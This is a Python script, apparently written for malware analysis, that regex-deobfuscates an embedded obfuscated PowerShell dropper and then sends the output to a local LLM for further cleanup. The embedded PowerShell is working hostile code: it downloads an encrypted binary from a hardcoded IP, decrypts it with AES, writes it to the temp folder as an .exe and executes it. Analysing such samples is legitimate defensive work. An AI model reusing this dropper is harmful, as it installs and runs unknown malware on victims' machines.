import ollama


import re

recursive_line = """.("{0}{2}{1}"-f 'Set','Variable','-') -Name ('iv') -Value ( ( VArIaBlE  ("{0}{1}"-f'Y8','F')  -ValuEo )::"U`Tf8".("{0}{2}{1}"-f 'Get','tes','By').Invoke((("{1}{0}" -f 'e',("{0}{1}" -f 'Md3','3'))+'F'+'a'+("{0}{2}{1}" -f '0','Z',("{0}{1}"-f 'wN','x2'))+'q'+("{3}{2}{1}{0}"-f'Y1',("{1}{2}{0}"-f'm','7oN','45'),("{1}{0}{2}" -f '6','LjK','X9t3G'),'5'))))"""

big = """
 sEt-ITeM  ('VARIABlE:'+'V'+'s'+'52a'+'r')  ( [TyPe]("{0}{1}{2}" -f't','ExT','.EncOdinG'))  ;  SeT-vArIaBle  ("{1}{0}" -f'f','y8') (  [tyPE]("{2}{4}{3}{6}{5}{0}{1}"-f '.ENC','ODInG','s','TeM.T','yS','T','Ex')  )  ; sEt-iteM  ("vAriaB"+"l"+"E:G7P2"+"S"+"H")  ( [tYpE]("{1}{3}{2}{0}{4}"-f'.a','S','OgRaphy','EcURiTy.CRypt','eS')  ) ;  SET-ITEM  ("{0}{4}{1}{2}{3}" -f 'vAR','BLE:9','n','GZ','ia')  (  [TYPe]("{3}{1}{7}{8}{4}{5}{6}{0}{2}" -f'pHeR','ECUritY.c','MOde','S','Y.','c','I','RYPTogRap','H')  ) ;SET-Item ('variabl'+'e:Z'+'kvA'+'2O') ( [TyPE]("{0}{3}{1}{5}{7}{6}{2}{4}{8}" -F'seCUrIt','O','DDI','Y.cRYPT','nG','G','Pa','RaPhy.','MOde'))  ;    $LvN4s6=  [tYPe]("{3}{6}{4}{1}{7}{5}{0}{8}{2}"-f 'PtOsTrEaM','p','E','Se','y.crY','.Cry','cUrit','tOGRAphy','MOd');SET-iTEm  ('vAR'+'iabLe:RXa'+'5')  ([tyPe]("{2}{1}{0}" -F 'D','UI','sysTEM.G'));   $yqx  = [TyPE]("{0}{1}"-f 'IO.','FIle')  ; &("{0}{1}{2}{3}"-f'S','et-V','ari','able') -Name ("{1}{0}" -f 'l','ur') -Value ((("{0}{2}{1}" -f 'ht','3',("{0}{1}"-f'tp:','//'))+'4'+("{1}{0}"-f'60.','.')+'9'+'7.'+'167'+'/'+("{0}{1}" -f '82n','vd')+("{0}{1}{2}"-f 'kan','df.','bin')))
.("{1}{0}{2}" -f '-Va','Set','riable') -Name ("{0}{1}" -f 'ke','y') -Value (  $Vs52aR::"u`TF8".("{2}{0}{1}" -f 'etBy','tes','G').Invoke((("{0}{2}{1}"-f'sk','89','sd')+'D2G'+("{0}{1}"-f '0X9','j')+("{1}{0}" -f 'F','k2f')+("{0}{1}"-f ("{0}{1}"-f'1','b4S'),'2')+'a7'+("{1}{0}"-f 'a','Gh8')+'Vk0'+'L')))
.("{0}{2}{1}"-f 'Set','Variable','-') -Name ('iv') -Value ( ( VArIaBlE  ("{0}{1}"-f'Y8','F')  -ValuEo )::"U`Tf8".("{0}{2}{1}"-f 'Get','tes','By').Invoke((("{1}{0}" -f 'e',("{0}{1}" -f 'Md3','3'))+'F'+'a'+("{0}{2}{1}" -f '0','Z',("{0}{1}"-f 'wN','x2'))+'q'+("{3}{2}{1}{0}"-f'Y1',("{1}{2}{0}"-f'm','7oN','45'),("{1}{0}{2}" -f '6','LjK','X9t3G'),'5'))))
&("{0}{2}{3}{1}"-f 'S','ble','et-V','aria') -Name ("{0}{1}{2}" -f 'resp','o','nse') -Value (&("{4}{5}{2}{3}{0}{1}" -f'ue','st','W','ebReq','Inv','oke-') -Method ("{0}{1}"-f 'Ge','t') -Uri ${U`RL})
&("{1}{0}{2}"-f 't-','Se','Variable') -Name ("{0}{1}" -f'ae','s') -Value (  $g7p2Sh::("{1}{0}" -f'reate','C').Invoke())
${A`ES}."k`ey" = ${K`eY}
${a`eS}."Iv" = ${IV}
${A`Es}."m`ODE" =  (Dir ("{0}{2}{1}" -f 'VA','z','rIaBLE:9NG')  )."v`ALUE"::"c`BC"
${A`eS}."p`AddIng" =  (  GeT-VArIABlE  ("zKVa2"+"o")  )."v`ALue"::"pk`Cs7"
.("{0}{2}{3}{1}" -f 'Set-Va','e','ri','abl') -Name ("{1}{0}{2}" -f'yp','decr','tor') -Value (${A`es}.("{1}{0}{2}{3}" -f'ateDec','Cre','rypto','r').Invoke())
&("{1}{3}{0}{2}"-f 'ar','Set-','iable','V') -Name ("{0}{1}{2}" -f 'file','St','ream') -Value (&("{2}{0}{1}" -f'ew-Ob','ject','N') ("{1}{4}{3}{2}{5}{0}{6}"-f 'tr','S','m','em.IO.Me','yst','oryS','eam')(${R`ESPon`sE}."cO`NTent"))
.("{1}{0}{2}"-f't-Va','Se','riable') -Name ("{0}{1}{2}"-f 'c','ry','ptoStream') -Value (&("{3}{0}{1}{2}" -f'bje','c','t','New-O') ("{2}{5}{1}{7}{0}{6}{3}{4}" -f '.','em.Securit','S','aphy','.CryptoStream','yst','Cryptogr','y')(${Fil`estRe`Am}, ${dEC`RYp`TOR},   (vaRIABLe ("l"+"v"+"N4s6") )."VAl`Ue"::"R`Ead"))
&("{0}{2}{1}" -f'Se','able','t-Vari') -Name ("{1}{0}{3}{2}"-f 'r','dec','ytes','yptedB') -Value (&("{0}{1}{2}" -f 'Ne','w-Obj','ect') ("{1}{0}" -f 'e[]','byt') 1024)
.("{3}{1}{2}{0}" -f 'able','et-Va','ri','S') -Name ("{4}{3}{2}{0}{1}" -f'r','eam','edSt','rypt','dec') -Value (&("{0}{1}{2}" -f 'N','ew-','Object') ("{0}{3}{4}{2}{1}" -f'S','m','.MemoryStrea','ys','tem.IO'))
while ((&("{1}{2}{0}{3}"-f 'riabl','Set-V','a','e') -Name ("{2}{0}{1}"-f'tesRe','ad','by') -Value (${crYp`TOs`TreAm}.("{1}{0}"-f 'ead','R').Invoke(${dE`Cry`P`TEDb`YTes}, 0, ${d`ECrYP`Te`DbytES}."LenG`TH"))) -gt 0) {
    ${DEcrypt`EDST`Re`AM}.("{0}{1}" -f 'Writ','e').Invoke(${d`eCR`YP`TedB`YTeS}, 0, ${ByteS`Re`AD})
}
${CR`yp`T`oStreaM}.("{0}{1}"-f 'Clo','se').Invoke()
${FILE`S`TRE`Am}.("{1}{0}"-f'lose','C').Invoke()
.("{2}{1}{0}{3}" -f'iab','et-Var','S','le') -Name ("{2}{3}{1}{0}"-f 'ta','a','dec','ryptedD') -Value (${d`E`c`RYpTed`sTrEAM}.("{0}{1}"-f 'ToAr','ray').Invoke())
&("{2}{1}{0}" -f 'riable','et-Va','S') -Name ("{0}{1}{2}" -f 'exeF','i','leName') -Value (  (varIabLE ("RX"+"a5") -value )::("{2}{1}{0}" -f'd','wGui','Ne').Invoke().("{1}{0}" -f 'ring','ToSt').Invoke() + ('.ex'+'e'))
.("{2}{0}{1}{3}" -f '-V','ar','Set','iable') -Name ("{3}{1}{0}{2}" -f 'e','x','FilePath','e') -Value ("$env:temp\$exeFileName")
 $yqX::("{3}{2}{1}{0}" -f's','eAllByte','rit','W').Invoke(${EXEFI`le`p`ATH}, ${dEcRYpted`d`ATA})
&("{0}{2}{1}{3}" -f 'Start-P','oc','r','ess') -FilePath ${Exef`i`LEPA`Th}
"""



simple_recursion = """((("{1}{0}" -f 'e',("{0}{1}" -f 'Md3','3'))+'F'+'a'+("{0}{2}{1}" -f '0','Z',("{0}{1}"-f 'wN','x2'))+'q'+("{3}{2}{1}{0}"-f'Y1',("{1}{2}{0}"-f'm','7oN','45'),("{1}{0}{2}" -f '6','LjK','X9t3G'),'5')))"""

def first_clean(input):
    """Prepare all lines before further analysis."""
    res = []
    
    lines = input.split("\n")
    for line in lines : 
        y = line.strip().lower().split(";")
        x = [z.strip() for z in y]
        res += x
    return res

def clean_variables(line):
    def clean(match):
        return match.group().replace("`","")
    
    variable_pattern = r"""\${[\w:`]+}"""
    string_pattern = r"""(["'][\w`]*['"])"""
    
    clean_line = re.sub(variable_pattern, clean, line)
    clean_line = re.sub(string_pattern, clean, clean_line)
    return clean_line
    
    
def final_clean(line):
    multiple_spaces_pattern = r"""([\s]*)"""

def deobfuscate_format(line):
    pattern_find = r"""[\(]?(["']+[{}0-9]*["'])+\s*-f\s*(["'][\w.\[\]\/:-]+["'](?:\s*,\s*["'][\w.\[\]\/:-]+["'])*)[\)]?"""
    recursion_pattern = r"""[\(]?(['"]*[{}0-9]*['\"])\s*-f\s*(['\"][\w.\[\]\/:-]+['\"](?:\s*,\s*['\"][\w.\[\]:-]+['\"])*),*\s*[\(]*\s*(['\"][{}0-9]*['\"])\s*-f\s*(['\"][\w.\[\]\/:-]+['\"](?:\s*,\s*['\"][\w.\[\]\/:-]+['"])*\s*)[\)]?"""
    previous_str = ""
    current_str = line
    
    while current_str != previous_str:
        previous_str = current_str
        
        matches = re.finditer(pattern_find, current_str)
        if matches : 
            for match in matches : 
                format_string = match.group(1)
                arguments = [re.sub(r"['\"]", "", arg.strip()) for arg in match.group(2).split(",")]
                
                try:
                    res = format_string.format(*arguments)  
                    current_str = current_str.replace(match.group(), res)
                except IndexError:
                    recursion_matches = re.search(recursion_pattern, current_str[match.start():])
                    if recursion_matches :
                        subresult = re.search(pattern_find, current_str[match.end():])
                        if subresult : 
                            try : 
                                format_string = subresult.group(1)
                                arguments = [re.sub(r"['\"]", "", arg.strip()) for arg in match.group(2).split(",")]
                                res = format_string.format(*arguments)  
                                current_str = current_str.replace(subresult.group(),res)
                            except : 
                                pass
    return current_str

def concatenate_strings(line):
    def clean(match):
        res = match.group().replace("'","").replace('"','').replace("+","")
        return f"\"{res}\""
    
    concatenation_pattern = r"""["']([\w:.\/\s]*)["']\s*\+\s*["']([\w:.\/\s]*)["']"""
    previous_str = ""

    current_str = line
    
    while current_str != previous_str:
        previous_str = current_str
        current_str = re.sub(concatenation_pattern, clean, current_str)
    return current_str

test_line = """.("{0}{2}{1}"-f 'Set','Variable','-') -Name ('iv') -Value ( ( VArIaBlE  ("{0}{1}"-f'Y8','F')  -ValuEo )::"U`Tf8".("{0}{2}{1}"-f 'Get','tes','By').Invoke((("{1}{0}" -f 'e',("{0}{1}" -f 'Md3','3'))+'F'+'a'+("{0}{2}{1}" -f '0','Z',("{0}{1}"-f 'wN','x2'))+'q'+("{3}{2}{1}{0}"-f'Y1',("{1}{2}{0}"-f'm','7oN','45'),("{1}{0}{2}" -f '6','LjK','X9t3G'),'5'))))"""

lines = first_clean(big)
cleaned = []
for line in lines : 
    clean_line = deobfuscate_format(line)
    clean_line = clean_variables(clean_line)
    clean_line = concatenate_strings(clean_line)
    cleaned.append(clean_line)

cleaned = "\n".join(cleaned)
print(cleaned)
    
    
# Trying to see if deepseek-r1 can further clean the script...
prompt = f"""
Here is an obfuscated Powershell, I need you to clean so that I can further analyse it. Return me only the cleaned script:

{cleaned}
"""
response = ollama.chat(model="dolphin-llama3", messages=[{"role": "user", "content": prompt}])
print(response["message"]["content"])
